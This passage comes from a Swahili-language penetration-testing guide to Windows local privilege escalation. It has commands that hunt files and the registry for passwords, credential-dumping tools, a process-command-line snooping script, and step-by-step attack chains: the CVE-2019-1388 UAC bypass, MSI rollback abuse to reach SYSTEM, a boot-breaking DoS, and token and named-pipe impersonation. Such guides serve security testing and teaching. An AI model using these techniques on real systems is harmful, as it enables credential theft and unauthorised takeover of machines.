dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta kwenye rejista kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Vifaa vinavyotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni msf** plugin; niliunda plugin hii ili **itekeleze moja kwa moja kila metasploit POST module inayotafuta credentials** ndani ya mwanaathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana kadhaa ambazo zinaweka data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaoendesha kama SYSTEM hufungua mchakato mpya** (`OpenProcess()`) kwa **full access**. Mchakato huo huo **pia huunda mchakato mpya** (`CreateProcess()`) **enye vibali vya chini lakini vinarithi (inheriting) handles zote zilizofunguliwa za mchakato kuu**.\
Kisha, ikiwa una **full access to the low privileged process**, unaweza kunyakua **open handle to the privileged process created** na `OpenProcess()` na **kuchoma shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, zinawezesha mawasiliano ya michakato na uhamishaji wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kuruhusu michakato isiyohusiana kushirikiana data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu yameainishwa kama **named pipe server** na **named pipe client**.

Wakati data imetumwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **kujichukua utambulisho** wa **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato wenye vibali** unao wasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata vibali vya juu** kwa kuchukua utambulisho wa mchakato huo mara tu unaposhirikiana na pipe uliyoianzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, mwongozo yanayofaa yanapatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Vivyo hivyo, zana ifuatayo inaruhusu **kupiga intercept mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Mengine

### Nyongeza za faili ambazo zinaweza kuendesha kitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### **Kufuatilia mistari ya amri kwa nywila**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au michakato mingine inayoendeshwa ambayo **pass credentials on the command line**. Script hapa chini inakamata mistari ya amri ya mchakato kila sekunde mbili na inalinganisha hali ya sasa na hali ya awali, ikitoa tofauti yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji mwenye Vibali Vidogo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha grafiki (via console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na vibali.

Hii inafanya iwezekane kupandisha vibali na kupita UAC kwa wakati mmoja kwa kutumia udhaifu ule ule. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa mchakato, imewekwa saini na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathirika ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili exploit udhaifu huu, inahitajika kufanya hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Una mafaili yote na taarifa muhimu katika hazina ya GitHub ifuatayo:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Mbinu iliyobainishwa [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hilo kwa msingi linahusisha kunufaika na kipengele cha rollback cha Windows Installer kubadilisha faili halali na faili zenye uharibifu wakati wa mchakato wa uninstall. Kwa hili mshambuliaji anahitaji kuunda **malicious MSI installer** ambayo itatumika kunyakua folda `C:\Config.Msi`, ambayo baadaye Windows Installer itaitumia kuhifadhi faili za rollback wakati wa uninstall ya vifurushi vingine vya MSI ambapo faili za rollback zingekuwa zimebadilishwa zikiwa na payload yenye uharibifu.

Mbinu iliyojumlishwa ni kama ifuatavyo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Hatua 1: Install the MSI
- Unda `.msi` ambayo inasakinisha faili isiyo na madhara (mfano, `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Chora installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuendesha.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Hatua 2: Begin Uninstall
- Uninstall `.msi` hiyo.
- Mchakato wa uninstall unaanza kusogeza faili kwenda `C:\Config.Msi` na kuwaongeza jina la `.rbf` (rollback backups).
- **Fuatilia handle iliyofunguliwa** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati faili inapoanza kuwa `C:\Config.Msi\<random>.rbf`.

- Hatua 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inatoa signal wakati `.rbf` imeandikwa.
- Kisha **inasubiri** kwenye event nyingine kabla ya kuendelea na uninstall.

- Hatua 4: Block Deletion of `.rbf`
- Wakati umepewa signal, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **inazuia kufutwa kwake**.
- Kisha **tuma signal nyuma** ili uninstall iendelee.
- Windows Installer haitafanikiwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haifutwi**.

- Hatua 5: Manually Delete `.rbf`
- Wewe (mshambuliaji) unafuta `.rbf` kwa mkono.
- Sasa **`C:\Config.Msi` ni tupu**, tayari kunyaliwa (hijacked).

> Katika hatua hii, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Hatua 6: Recreate `C:\Config.Msi` with Weak ACLs
- Rekebisha tena folda `C:\Config.Msi` yenyewe.
- Weka **weak DACLs** (mfano, Everyone:F), na **weka handle wazi** kwa `WRITE_DAC`.

- Hatua 7: Run Another Install
- Sakinisha `.msi` tena, ukiwa na:
- `TARGETDIR`: Mahali pa kuandika.
- `ERROROUT`: Kigezo kinachosababisha failure iliyazoeleweka.
- Sakinisho hili litatumika kusababisha **rollback** tena, ambalo linasoma `.rbs` na `.rbf`.

- Hatua 8: Monitor for `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ianze kuonekana.
- Rekodi jina lake.

- Hatua 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inatoa signal wakati `.rbs` imetengenezwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Hatua 10: Reapply Weak ACL
- Baada ya kupokea event ya `rbs created`:
- Windows Installer **inaweka tena strong ACLs** kwenye `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza tena **kuweka weak ACLs** tena.

> ACLs zinatumika **tu wakati handle inafunguliwa**, kwa hivyo bado unaweza kuandika kwenye folda.

- Hatua 11: Drop Fake `.rbs` and `.rbf`
- Bandika juu ya faili ya `.rbs` skripti ya rollback ya kuigiza ambayo inaelekeza Windows:
- Kurudisha `.rbf` yako (DLL mabaya) kwenye mahali lenye haki ya juu (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka `.rbf` yako ya uongo yenye **malicious SYSTEM-level payload DLL**.

- Hatua 12: Trigger the Rollback
- Tuma signal ya sync ili installer iendelee.
- Custom action ya aina 19 (`ErrorOut`) imepangwa kusababisha kusakinisha kushindikana kwa makusudi kwa hatua inayojulikana.
- Hii husababisha **rollback kuanza**.

- Hatua 13: SYSTEM Installs Your DLL
- Windows Installer:
- Inasoma `.rbs` yako ya uharibifu.
- Inakopa `.rbf` yako DLL hadi mahali lengwa.
- Sasa una **DLL yako ya uharibifu katika path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Execute SYSTEM Code
- Endesha binary inayothaminiwa na mfumo yenye auto-elevation (mfano, `osk.exe`) inayopakia DLL uliyonyakua.
- **Boom**: Msimbo wako unaendeshwa **kwa SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Mbinu kuu ya MSI rollback (ile ya awali) inadhani unaweza kufuta **folda nzima** (mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **kufuta faili yoyote bila mpangilio**?

Unaweza kutumia mambo ya ndani ya NTFS: kila folda ina alternate data stream iliyofichwa iitwayo:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
This stream inahifadhi **index metadata** ya folda.

Hivyo, ikiwa utafuta **stream ya `::$INDEX_ALLOCATION`** ya folda, NTFS itaondoa **folda nzima** kutoka kwenye filesystem.

Unaweza kufanya hivyo kwa kutumia APIs za kawaida za ufutaji faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha *file* delete API, inafuta **folder yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Vipi ikiwa primitive yako haitaruhusu kufuta arbitrary files/folders, lakini **inaruhusu kufuta *contents* ya attacker-controlled folder**?

1. Hatua 1: Sanidi bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- oplock hiyo **inasimamisha utekelezaji** wakati privileged process inapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Chochea mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchambua folda (kwa mfano, `%TEMP%`) na hujaribu kufuta yaliyomo ndani yake.
- Wakati inafikia `file1.txt`, **oplock inachochea** na inapeleka udhibiti kwa callback yako.

4. Hatua 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inaufanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo litaachilia oplock mapema.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Tengeneza **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folda — kuifuta kunasababisha kufutwa kwa folda.

5. Hatua 5: Kuachilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa hakika inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Kabrasha Lolote hadi DoS ya Kudumu

Tumia primitive inayokuwezesha **kuunda kabrasha lolote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **kabrasha** (sio faili) kwa jina la **dereva muhimu wa Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na kernel-mode driver `cng.sys`.
- Ikiwa utaifanya mapema kama folda, Windows itashindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows itajaribu kupakia `cng.sys` wakati wa boot.
- Inaiona folda, **inashindwa kutambua driver halisi**, na **inaanguka (crashes) au kusimamisha boot**.
- Hakuna **mbadala**, na hakuna **urejesho** bila kuingilia kutoka nje (mfano, ukarabati wa boot au ufikiaji wa diski).


## **Kutoka High Integrity hadi SYSTEM**

### **Huduma mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, **njia hadi SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapotengeneza service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika kwa haraka kwani itauawa baada ya 20s ikiwa si service halali.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[Maelezo zaidi kuhusu funguo za rejista zinazohusika na jinsi ya kufunga kifurushi _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata the code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**Unaweza kupata** [**mfano wa code inayoendesha mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii inatumiwa na meterpreter kupandisha hadhi kwa `getsystem`. Mbinu inahusisha **kutengeneza pipe kisha kuunda/kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyotengeneza pipe kwa kutumia ruhusa ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service) na kupata ruhusa za SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu named pipes usome hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kuona mfano wa [**jinsi ya kutoka High Integrity hadi System ukitumia named pipes soma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utaweza hijack a dll inayopakiwa na process inayofanya kazi kama SYSTEM utaweza kutekeleza arbitrary code kwa ruhusa hizo. Hivyo Dll Hijacking pia inafaa kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka kwa mchakato wa High Integrity** kwa sababu itakuwa na **write permissions** kwenye folders zinazotumika kupakia dlls.\
**Unaweza** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Chombo bora kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imetambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations zinazowezekana na kukusanya info (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za sessions zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imetambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Tumia passwords zilizokusanywa kufanya password spray dhidi ya domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na chombo cha man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Orodhesho la msingi la Windows kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- Tafuta privesc vulnerabilities zinazojulikana (DEPRECATED kwa Watson)~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta privesc vulnerabilities zinazojulikana (inahitaji ku-compilea kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Orodhesha host akitafuta misconfigurations (zaidi kama chombo cha kukusanya info kuliko privesc) (inahitaji ku-compilea) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwa programu nyingi (exe iliyotayarishwa mapema kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- Angalia misconfigurations (executable precompiled kwenye github). Haipendekezwi. Haifanyi vizuri kwenye Win10.~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haifanyi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Chombo kilichotengenezwa kulingana na chapisho hili (hakihitaji accesschk ili kifanye kazi vizuri lakini kinaweza kukitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Huchambua output ya **systeminfo** na kupendekeza exploits zinazoendelea kufanya kazi (python ya local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Huchambua output ya **systeminfo** na kupendekeza exploits zinazoendelea kufanya kazi (python ya local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Lazima u-compile project ukitumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathirika unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
